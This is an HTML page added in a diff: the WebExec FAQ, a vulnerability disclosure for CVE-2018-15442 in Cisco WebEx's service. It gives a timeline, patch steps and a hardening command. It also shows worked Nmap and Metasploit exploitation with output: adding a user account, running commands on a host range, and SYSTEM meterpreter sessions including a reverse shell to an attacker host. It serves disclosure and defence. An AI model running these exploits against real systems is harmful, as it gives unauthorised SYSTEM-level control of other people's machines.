@@ -1,0 +1,277 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="Content-Style-Type" content="text/css" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Latest compiled and minified CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+
+  <!-- jQuery library -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- Latest compiled JavaScript -->
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+  <title>WebExec - Overview</title>
+  <style type="text/css">code{white-space: pre;}</style>
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-47460499-2"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'UA-47460499-2');
+  </script>
+</head>
+<body>
+<div class='container'>
+
+<h1 id="webexec-faq">WebExec FAQ</h1>
+
+<h2 id="credit">Credit</h2>
+
+<p>Discovered by <a href="https://twitter.com/iagox86">Ron Bowes</a> and <a href="https://twitter.com/jeffmcjunkin">Jeff McJunkin</a> of <a href="https://counterhackchallenges.com">Counter Hack</a>! You can view the technical writeup <a href="https://blog.skullsecurity.org/2018/technical-rundown-of-webexec">here, on Ron's blog</a> and <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection'>Cisco's advisory</a></p>
+
+<p>If you have any questions or concerns, I made an email alias specifically for this issue: <a href="mailto:info@webexec.org">info@webexec.org</a>!</p>
+
+<h2 id="what-is-webexec">What is WebExec?</h2>
+
+<p>WebExec is a vulnerability in, as the name implies, Cisco's WebEx client software. This is a pretty unique vulnerability, because it's a remote vulnerability in a client application that doesn't even listen on a port. The summary is: when the WebEx client is installed, it also installs a Windows service called WebExService that can execute arbitrary commands at SYSTEM-level privilege. Due to poor ACLs, any local or domain user can start the process over Window's remote service interface (except on Windows 10, which requires an administrator login).</p>
+
+<p>This will be somewhat of a "living" document initially, where we'll collect any patches, exploits, blogs, or further details as they emerge. Email me if you see anything that should be added!</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<p>We have to thank Cisco's PSIRT team from being super responsive and working with us to get this mitigated and to get an advisory released in a timely fashion! They've been wonderful to work with!</p>
+
+<ul>
+<li>2018-07-24 Discovered the vulnerability</li>
+<li>2018-08-06 Realized it was remotely exploitable</li>
+<li>2018-08-06 Reported to vendor's PSIRT team with a 90-day disclosure deadline</li>
+<li>2018-08-31 Vendor confirmed they were able to replicate</li>
+<li>2018-08-31 Vendor proposed an initial patch</li>
+<li>2018-09-05 Vendor <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180905-webex-pe">pushed a fix</a> for the less critical issue</li>
+<li>2018-10-03 Vendor pushed a fix for the major issue, which requires the .exe being executed to be WebEx-signed</li>
+<li>2018-10-11 Vendor told us about the fix, and requested we hold the embargo till they release their advisory</li>
+<li>2018-10-17 Vendor confirmed the release of the advisory would be very soon</li>
+<li>2018-10-24 Vendor <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection'>released the advisory</a>, and this was published
+<li>2018-10-25 Vendor backported the fix to version 33.5.6 (in addition to 33.6.0)</li>
+<li>2018-11-08 Reported a bypass to the vendor, with sample exploit code</li>
+<li>2018-11-09 Vendor informed us that several others had reported the bypass already, and that they have a fix in the works</li>
+<li>2018-11-27 Vendor released <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection'>their new advisory</a> - see "<a href='#redux'>Redux</a>" at the bottom</li>
+</ul>
+
+<h2 id="how-do-i-fix-it">How do I fix it?</h2>
+
+<p>Cisco Webex Meetings Desktop App fixes this issue in versions 33.5.6 and 33.6.0. You can update by launching the Cisco Webex Meetings application and clicking the Gear in the top right of the application window then choosing the <em>Check for Updates</em> entry from the drop-down list. This is also documented in the article, <a href='https://collaborationhelp.cisco.com/article/en-us/n1kwkd6'>Update the Cisco Webex Meetings Desktop App</a>.</p>
+
+<p>Cisco Webex Productivity Tools fixes this vulnerability in version 33.0.5 and later. Cisco Webex Productivity Tools has been replaced with Cisco Webex Meetings Desktop App since Cisco Webex Meetings Release 33.2.0.  You can update by launching the Cisco Webex Meetings application and clicking Settings in the top right of the application window then choosing <em>Check for Updates</em> from the drop-down list. This is documented in more detail in the article, <a href='https://collaborationhelp.cisco.com/article/en-us/nk758tr'>Check for Cisco Webex Productivity Tools Updates for Windows</a></p>
+
+<p>Administrators can update for their entire userbase using the article <a href='https://collaborationhelp.cisco.com/article/en-us/nulpixd'>IT Administrator Guide for Mass Deployment of the Cisco Webex Meetings Desktop App.</a></p>
+
+<p>The updated client will validate that the executable being run is signed by WebEx before executing it, which fixes this vulnerability, but may leave further issues open. As such, we'd strongly recommend running this command on every workstation with WebEx installed, if possible:</p>
+
+<pre>c:\&gt; sc sdset webexservice D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)</pre>
+
+<p>Under the default configuration for WebExService, even when patched, any user with an account can start the service. That's fundamentally dangerous, even after patching. The command shown above removes that permission so it can be started by any local user (interactive sessions or RDP), or any administrative user.</p>
+
+<h2 id="did-you-really-need-to-give-it-a-name">Did you really need to give it a name?</h2>
+
+<p>Nope, but at least we didn't give it a logo!</p>
+
+<h2 id="how-can-i-check-for-and-exploit-it">How can I check for and exploit it?</h2>
+
+<p>We have written checks and exploits in several frameworks!</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>We developed a pair of Nmap scripts, one to check for the vulnerability (<a href='https://nmap.org/nsedoc/scripts/smb-vuln-webexec.html'><code>smb-vuln-webexec.nse</code></a>) and one to run actual code (<a href='https://nmap.org/nsedoc/scripts/smb-webexec-exploit.html'><code>smb-webexec-exploit.nse</code></a>) (those links may not be ready yet). You can check out the full code from <a href='https://svn.nmap.org/nmap/'>Nmap's SVN</a> or <a href='https://github.com/nmap/nmap'>on Nmap's git</a>!</p>
+
+<p>The following Nmap command will check whether or not a system is vulnerable by attempting to exploit the issue &mdash; note that this requires credentials of some kind (in a domain scenario, it can be any set of credentials):</p>
+
+<pre>nmap --script smb-vuln-webexec --script-args &#39;smbusername=testuser,smbpass=testuser,vulns.showall&#39; -p139,445 -d &lt;target&gt;</pre>
+
+<p>Against a vulnerable system, it'll print:</p>
+
+<pre>
+  PORT    STATE SERVICE      REASON
+  445/tcp open  microsoft-ds syn-ack
+  | smb-vuln-webexec: 
+  |   VULNERABLE:
+  |   Remote Code Execution vulnerability in WebExService
+  |     State: VULNERABLE
+  |     IDs:  CVE:CVE-2018-15442
+  |     Risk factor: HIGH
+  |       A critical remote code execution vulnerability exists in WebExService (WebExec).
+  |     Disclosure date: 2018-10-24
+  |     References:
+  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15442
+  |       https://blog.skullsecurity.org/2018/technical-rundown-of-webexec
+  |_      https://webexec.org
+</pre>
+
+<p>On a system without WebEx, the output is:</p>
+
+<pre>
+  PORT    STATE SERVICE      REASON
+  445/tcp open  microsoft-ds syn-ack
+  | smb-vuln-webexec: 
+  |   NOT VULNERABLE:
+  |   Remote Code Execution vulnerability in WebExService
+  |     State: NOT VULNERABLE
+  |     IDs:  CVE:CVE-2018-15442
+  |     References:
+  |       https://webexec.org
+  |       https://blog.skullsecurity.org/2018/technical-rundown-of-webexec
+  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15442
+</pre>
+
+<p>Using <code>smb-webexec-exploit.nse</code>, we can attempt to actually run commands. It's difficult to determine if the commands actually run, however, so we suggest using both scripts if you want to be sure. Here's an example:</p>
+
+<pre>
+$ ./nmap -p445 --script=smb-webexec-exploit --script-args='smbuser=testuser,smbpass=testuser,webexec_command=net user nmap nmap /add' 192.168.56.101
+Starting Nmap 7.70SVN ( https://nmap.org ) at 2018-10-18 11:49 PDT
+Nmap scan report for 192.168.56.101
+Host is up (0.00036s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_smb-webexec-exploit: Asked WebExService to run net user nmap nmap /add
+</pre>
+
+<p>That will add the user <code>nmap</code> to the remote system. You can run any command you want &mdash; be creative!</p>
+
+<p>If you have access to the host's UI, you may also want a command to run with a GUI. The previous invocation may or may not run with a GUI &mdash; we're not 100% sure why or why not &mdash; but to guarentee a GUI, use the <code>webexec_gui_command</code> argument:</p>
+
+<pre>
+$ ./nmap -p445 --script=smb-webexec-exploit --script-args='smbuser=testuser,smbpass=testuser,webexec_gui_command=cmd.exe' 192.168.56.101
+Starting Nmap 7.70SVN ( https://nmap.org ) at 2018-10-18 11:51 PDT
+Nmap scan report for 192.168.56.101
+Host is up (0.00036s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_smb-webexec-exploit: Asked WebExService to run cmd.exe (with a GUI)
+</pre>
+
+<h3 id="metasploit">Metasploit</h3>
+
+<p>We also developed a series of Metasploit modules! They're available in the <a href='https://github.com/rapid7/metasploit-framework'>git version of Metasploit</a>!</p>
+
+<p>This version of Metasploit contains three new modules to exploit WebExec: an auxiliary module for running an arbitrary command, an exploit module for running an arbitrary exploit, and a local module for privilege escalation. I'll have another technical post that talks about how those work, but using them is straightforward:</p>
+
+<pre>
+  msf5 &gt; use auxiliary/admin/smb/webexec_command 
+  msf5 auxiliary(admin/smb/webexec_command) &gt; set RHOSTS 192.168.1.100-110
+  RHOSTS =&gt; 192.168.56.100-110
+  msf5 auxiliary(admin/smb/webexec_command) &gt; set SMBUser testuser
+  SMBUser =&gt; testuser
+  msf5 auxiliary(admin/smb/webexec_command) &gt; set SMBPass testuser
+  SMBPass =&gt; testuser
+  msf5 auxiliary(admin/smb/webexec_command) &gt; set COMMAND calc
+  COMMAND =&gt; calc
+  msf5 auxiliary(admin/smb/webexec_command) &gt; exploit
+  
+  [-] 192.168.56.105:445    - No service handle retrieved
+  [+] 192.168.56.105:445    - Command completed!
+  [-] 192.168.56.103:445    - No service handle retrieved
+  [+] 192.168.56.103:445    - Command completed!
+  [+] 192.168.56.104:445    - Command completed!
+  [+] 192.168.56.101:445    - Command completed!
+  [*] 192.168.56.100-110:445 - Scanned 11 of 11 hosts (100% complete)
+  [*] Auxiliary module execution completed
+</pre>
+
+<p>And to exploit it with an arbitrary payload:</p>
+
+<pre>
+  msf5 &gt; use exploit/windows/smb/webexec 
+  msf5 exploit(windows/smb/webexec) &gt; set SMBUser testuser
+  SMBUser =&gt; testuser
+  msf5 exploit(windows/smb/webexec) &gt; set SMBPass testuser
+  SMBPass =&gt; testuser
+  msf5 exploit(windows/smb/webexec) &gt; set PAYLOAD windows/meterpreter/bind_tcp
+  PAYLOAD =&gt; windows/meterpreter/bind_tcp
+  msf5 exploit(windows/smb/webexec) &gt; set RHOSTS 192.168.56.101
+  RHOSTS =&gt; 192.168.56.101
+  msf5 exploit(windows/smb/webexec) &gt; exploit
+  
+  [*] 192.168.56.101:445 - Connecting to the server...
+  [*] 192.168.56.101:445 - Authenticating to 192.168.56.101:445 as user &#39;testuser&#39;...
+  [*] 192.168.56.101:445 - Command Stager progress -   0.96% done (999/104435 bytes)
+  [*] 192.168.56.101:445 - Command Stager progress -   1.91% done (1998/104435 bytes)
+  ...
+  [*] 192.168.56.101:445 - Command Stager progress -  98.52% done (102891/104435 bytes)
+  [*] 192.168.56.101:445 - Command Stager progress -  99.47% done (103880/104435 bytes)
+  [*] 192.168.56.101:445 - Command Stager progress - 100.00% done (104435/104435 bytes)
+  [*] Started bind TCP handler against 192.168.56.101:4444
+  [*] Sending stage (179779 bytes) to 192.168.56.101
+  
+  meterpreter &gt; getuid
+  Server username: NT AUTHORITY\SYSTEM
+</pre>
+
+<p>Finally, the local privilege escalation module, which is used after a session already exists as a non-SYSTEM user:</p>
+
+<pre>
+  meterpreter &gt; getuid
+  Server username: IEWIN7\IEUser
+  meterpreter &gt; background
+  [*] Backgrounding session 1...
+  msf exploit(multi/handler) &gt; use exploit/windows/local/webexec
+  msf exploit(windows/local/webexec) &gt; set SESSION 1
+  SESSION =&gt; 1
+  msf exploit(windows/local/webexec) &gt; set payload windows/meterpreter/reverse_tcp
+  payload =&gt; windows/meterpreter/reverse_tcp
+  msf exploit(windows/local/webexec) &gt; set LHOST 172.16.222.1
+  LHOST =&gt; 172.16.222.1
+  msf exploit(windows/local/webexec) &gt; set LPORT 9001
+  LPORT =&gt; 9001
+  msf exploit(windows/local/webexec) &gt; run
+  
+  [*] Started reverse TCP handler on 172.16.222.1:9001
+  [*] Checking service exists...
+  [*] Writing 73802 bytes to %SystemRoot%\Temp\yqaKLvdn.exe...
+  [*] Launching service...
+  [*] Sending stage (179779 bytes) to 172.16.222.132
+  [*] Meterpreter session 2 opened (172.16.222.1:9001 -&gt; 172.16.222.132:49574) at 2018-08-31 14:45:25 -0700
+  [*] Service started...
+  
+  meterpreter &gt; getuid
+  Server username: NT AUTHORITY\SYSTEM
+</pre>
+
+<h2 id="redux">Redux</h2>
+
+On November 8 we reported a bypass to the patch, which was reported by several others at the same time. On November 27, the fix was released.
+
+Essentially, a WebEx-signed .exe file would load an unsigned .dll file. As a result, you could host a .exe and .dll on a fileshare, and tell WebEx to execute the .exe. It'll happily load the .exe, which will happily execute the .dll. We haven't done a proper write-up yet, but you can take a look at <a href='https://webexec.org/data/WebExec%20Redux%20Disclosure.pdf'>our formal disclosure</a> and <a href='https://webexec.org/data/WCLDll_template.zip'>the associated project it mentions</a>.
+
+This new bug is manually exploitable, but is not easy to automate.
+
+<h2>Conclusion</h2>
+
+So that's a quick overview of the WebExec vulnerability and some exploits we wrote. we'll update this page with more exploits or writeups as they're discovered! If We're missing something, don't hesitate to email me @ <a href="mailto:info@webexec.org">info@webexec.org</a>!
+
+<h2>References</h2>
+
+<ul>
+	<li><a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection'>Cisco WebEx Advisory</a></li>
+	<li><a href='https://blog.skullsecurity.org/2018/technical-rundown-of-webexec'>Technical writeup</a></li>
+	<li><a href='https://nmap.org/nsedoc/scripts/smb-vuln-webexec.html'>smb-vuln-webexec.nse</a> and <a href='https://nmap.org/nsedoc/scripts/smb-webexec-exploit.html'>smb-webexec-exploit.nse</a></li>
+	<li><a href='https://github.com/iagox86/metasploit-framework-webexec'>Metasploit Framework fork</a></li>
+</ul>
+</body>
+</div>
+</html>
+
+
+
+#####EOF#####
+
+
